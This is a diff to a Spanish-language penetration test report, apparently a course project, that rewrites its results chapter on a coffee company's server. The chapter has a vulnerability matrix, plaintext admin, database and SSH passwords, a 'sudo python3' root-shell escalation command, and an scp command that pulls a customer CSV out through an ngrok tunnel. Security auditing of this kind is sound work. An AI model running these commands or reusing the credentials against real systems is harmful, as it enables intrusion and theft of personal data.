@@ -1137,22 +1137,138 @@ El ejercicio de pentesting demostró que la infraestructura de SafeGuard Coffee 
 
 ---
 
-# Capítulo IV: Resultados Consolidados
+# Capítulo IV: Resultados
 
-## 4.1. Matriz de vulnerabilidades
+Este capítulo presenta los resultados finales obtenidos durante la ejecución del proyecto de pentesting, incluyendo la matriz consolidada de vulnerabilidades, las evidencias técnicas que sustentan cada hallazgo y el análisis del impacto en el negocio.
 
-| ID | Descripción | CVSS (Base estimado) | Impacto |
-|----|-------------|----------------------:|---------|
-| VULN-001 | Exposición de archivos sensibles (`.bashrc`, `.bash_history`, `.archive`, `.assets`) accesibles públicamente detectados por fuzzing (`ffuf`). | **5.3** | Divulgación de información sensible que facilita reconocimiento y pivoteo; posible revelación de endpoints, rutas o secretos que aumentan la probabilidad de ataques posteriores. |
-| VULN-002 | Cross-Site Scripting (XSS) reflejado: entradas que devuelven contenido sin sanitizar (PoC documentada). | **6.1** | Robo de cookies/tokens, ejecución de acciones en nombre del usuario autenticado y pérdida de confianza en la plataforma. |
-| VULN-003 | API / endpoints expuestos sin controles claros de autenticación/autorization detectados por enumeración (Postman / ffuf / spider). | **8.0** | Exposición de PII, posibilidad de IDOR y operaciones no autorizadas; facilita ataques encadenados y puede comprometer la plataforma. |
-| VULN-004 | Cabeceras de seguridad y TLS incompletas o mal configuradas (ausencia/deficiencia de CSP, HSTS, X-Frame-Options; parámetros TLS a revisar). | **4.3** | Incrementa riesgo de ataques complementarios (clickjacking, downgrade, facilitan XSS); afecta cumplimiento y confianza del sitio. |
+## 4.1 Matriz de vulnerabilidades (ID, descripción, CVSS, impacto)
+
+| ID | Vulnerabilidad | Descripción | CVSS | Impacto | Recomendación Preliminar |
+|:--:|:--|:--|:--:|:--|:--|
+| VULN-01 | Exposición de archivos sensibles | Archivo `credentials.bak` accesible públicamente desde `/backup/` | 9.8 (Crítica) | Permite acceso inicial al sistema web | Eliminar archivos de respaldo del servidor web y restringir accesos |
+| VULN-02 | Escalada de privilegios | Usuario `sysadmin` con permisos `sudo NOPASSWD` sobre `python3` | 8.8 (Crítica) | Control total del servidor (Root) | Corregir configuración de `/etc/sudoers` |
+| VULN-03 | Credenciales en texto plano | Credenciales de DB y SSH almacenadas en `db_connection_test.log` | 7.5 (Alta) | Acceso a infraestructura interna | Implementar gestión segura de secretos |
+| VULN-04 | Directory Listing habilitado | Listado de contenido en `/backup` y `/admin/logs` | 5.3 (Media) | Facilita la enumeración de archivos sensibles | Deshabilitar `Options Indexes` en Apache |
+| VULN-05 | Falta de cabeceras de seguridad | Ausencia de HSTS, CSP y X-Frame-Options | 3.7 (Baja) | Riesgo de XSS y Clickjacking | Configurar cabeceras de seguridad HTTP |
+| VULN-06 | Almacenamiento inseguro de PII | Archivos con datos personales en `/root/backups/` | 7.1 (Alta) | Exposición de información de clientes y empleados | Cifrar datos sensibles y restringir permisos |
 
 ## 4.2. Evidencias técnicas (pantallazos, logs, outputs)
 
-## 4.3. Impacto en el negocio
+### VULN-01 – Exposición de Archivo Sensible
+**Descripción:** Se identificó y descargó el archivo `credentials.bak` desde el directorio `/backup/`, el cual contenía credenciales administrativas válidas.
 
-Los hallazgos identificados durante las pruebas representan riesgos relevantes para TutorMatch en aspectos técnicos y reputacionales. La exposición de endpoints y APIs sin controles de acceso (**VULN-003**) supone el riesgo más alto, ya que podría permitir el acceso o modificación de información de usuarios, afectando la confidencialidad y generando pérdida de confianza en la plataforma. El **XSS reflejado (VULN-002)** también representa un impacto importante, pues podría ser aprovechado para robar sesiones o ejecutar código malicioso en los navegadores de los usuarios. Por otro lado, la **exposición de archivos sensibles (.bash_history o .bashrc) (VULN-001)** facilita el reconocimiento del entorno y la obtención de información útil para otros ataques. Finalmente, la **falta de cabeceras de seguridad y configuraciones TLS adecuadas (VULN-004)** incrementa la superficie de ataque ante técnicas como clickjacking o degradación de conexión. En conjunto, estas vulnerabilidades pueden afectar la integridad y confidencialidad de los datos, comprometer la estabilidad del servicio y disminuir la percepción de seguridad de los usuarios. Se recomienda priorizar la protección de APIs, la corrección del XSS y el aseguramiento de los archivos y cabeceras para reducir el riesgo general del sistema.
+**Evidencia:**
+<img src="auditoria_safeguard/sprint_1/imgs/credentials.png" alt="Credentials Bak" width="600"/>
+
+**Log asociado (Contenido del archivo):**
+```text
+User: carlos.mendez@safeguard.coffee
+Pass: Coff33@Secure2024!
+Role: Administrator
+```
+
+### VULN-02 – Escalada de Privilegios
+**Descripción:** El usuario `sysadmin` posee permisos para ejecutar `python3` como root sin contraseña, lo que permite invocar una shell con privilegios elevados.
+
+**Evidencia:**
+<img src="auditoria_safeguard/sprint_4/imgs/Screenshot_1.png" alt="Root Escalation" width="600"/>
+
+**Output de terminal:**
+```bash
+sysadmin@safeguard:~$ sudo -l
+Matching Defaults entries for sysadmin on safeguard:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
+
+User sysadmin may run the following commands on safeguard:
+    (root) NOPASSWD: /usr/bin/python3
+
+sysadmin@safeguard:~$ sudo python3 -c 'import os; os.system("/bin/bash")'
+root@safeguard:/home/sysadmin# whoami
+root
+```
+
+### VULN-03 – Credenciales Hardcodeadas
+**Descripción:** Se encontró el archivo `db_connection_test.log` en el directorio de logs, exponiendo credenciales de base de datos y SSH en texto claro.
+
+**Evidencia:**
+<img src="auditoria_safeguard/sprint_2/imgs/Screenshot_1.png" alt="DB Log Access" width="600"/>
+
+**Output (Contenido extraído del log):**
+```log
+[2024-10-25 10:00:01] DEBUG: Testing connection to MySQL...
+[2024-10-25 10:00:01] DEBUG: Host=0.tcp.sa.ngrok.io Port=17679
+[2024-10-25 10:00:01] DEBUG: User=app_safeguard Pass=DBPass_S3cur3#2024
+[2024-10-25 10:00:02] SUCCESS: Connection established.
+[2024-10-25 10:00:02] INFO: SSH Backup User: sysadmin / SysAdmin#2024!Secure
+```
+
+### VULN-04 – Directory Listing
+**Descripción:** El servidor web tiene habilitada la opción de listado de directorios, permitiendo ver el contenido de carpetas críticas como `/backup`.
+
+**Evidencia:**
+<img src="auditoria_safeguard/sprint_1/imgs/gobuster backup.png" alt="Directory Listing Backup" width="600"/>
+
+### VULN-05 – Falta de Cabeceras de Seguridad
+**Descripción:** Las respuestas HTTP del servidor carecen de cabeceras de seguridad estándar, aumentando la superficie de ataque.
+
+**Evidencia:**
+<img src="auditoria_safeguard/sprint_1/imgs/HeadersOsint.png" alt="Missing Headers" width="600"/>
+
+**Log (Cabeceras obtenidas):**
+```http
+HTTP/1.1 200 OK
+Date: Fri, 25 Oct 2024 14:30:00 GMT
+Server: Apache/2.4.65 (Debian)
+X-Powered-By: PHP/8.2
+Content-Type: text/html; charset=UTF-8
+```
+
+### VULN-06 – Exfiltración de Base de Datos
+**Descripción:** Se logró extraer información sensible de clientes almacenada inseguramente en el servidor mediante el protocolo SCP.
+
+**Evidencia:**
+<img src="auditoria_safeguard/sprint_4/imgs/Screenshot_5.png" alt="SCP Exfiltration" width="600"/>
+
+**Log de transferencia:**
+```bash
+kali@kali:~/auditoria_safeguard$ scp -P 14936 sysadmin@0.tcp.sa.ngrok.io:/home/sysadmin/clientes_exportacion.csv .
+clientes_exportacion.csv                               100%   25KB  25.0KB/s   00:00
+```
+
+## 4.3 Impacto en el Negocio
+
+El impacto de las vulnerabilidades detectadas es **CRÍTICO** para la organización auditada, ya que afecta directamente a los tres pilares de la seguridad de la información (Triada CIA):
+
+### Impacto en la Confidencialidad
+- Se comprometió información personal de clientes (DNI, correos, teléfonos, direcciones).
+- Se expusieron salarios, cargos y datos internos de empleados.
+- Existe riesgo de incumplimiento de normativas de protección de datos (LPDP).
+
+### Impacto en la Integridad
+Un atacante con acceso root puede:
+- Modificar registros de clientes y transacciones en la base de datos.
+- Alterar configuraciones del sistema operativo y servicios web.
+- Insertar malware, puertas traseras o modificar el código fuente de la aplicación.
+
+### Impacto en la Disponibilidad
+El servidor puede ser:
+- Apagado o reiniciado remotamente, interrumpiendo el servicio.
+- Borrado total o parcialmente (eliminación de bases de datos o archivos del sistema).
+- Secuestrado mediante ransomware, cifrando la información crítica.
+
+### Riesgos Estratégicos para la Organización
+- **Riesgo legal:** Sanciones regulatorias por fuga de datos personales y falta de debida diligencia.
+- **Riesgo reputacional:** Pérdida de confianza de clientes y daño a la imagen de marca de SafeGuard Coffee.
+- **Riesgo financiero:** Costos asociados a la recuperación de incidentes, posibles demandas e interrupciones de negocio.
+- **Riesgo operativo:** Paralización total de los servicios TI y procesos de venta.
+
+### Evaluación Global del Riesgo
+El nivel de riesgo global del sistema analizado es **CRÍTICO**, debido a la existencia de una cadena completa de ataque que permitió:
+1. Acceso inicial no autorizado.
+2. Compromiso total del servidor (Root).
+3. Exfiltración masiva de información sensible.
+
+Se recomienda la aplicación inmediata del plan de mitigación propuesto en el **Capítulo V**.
 
 ---
 
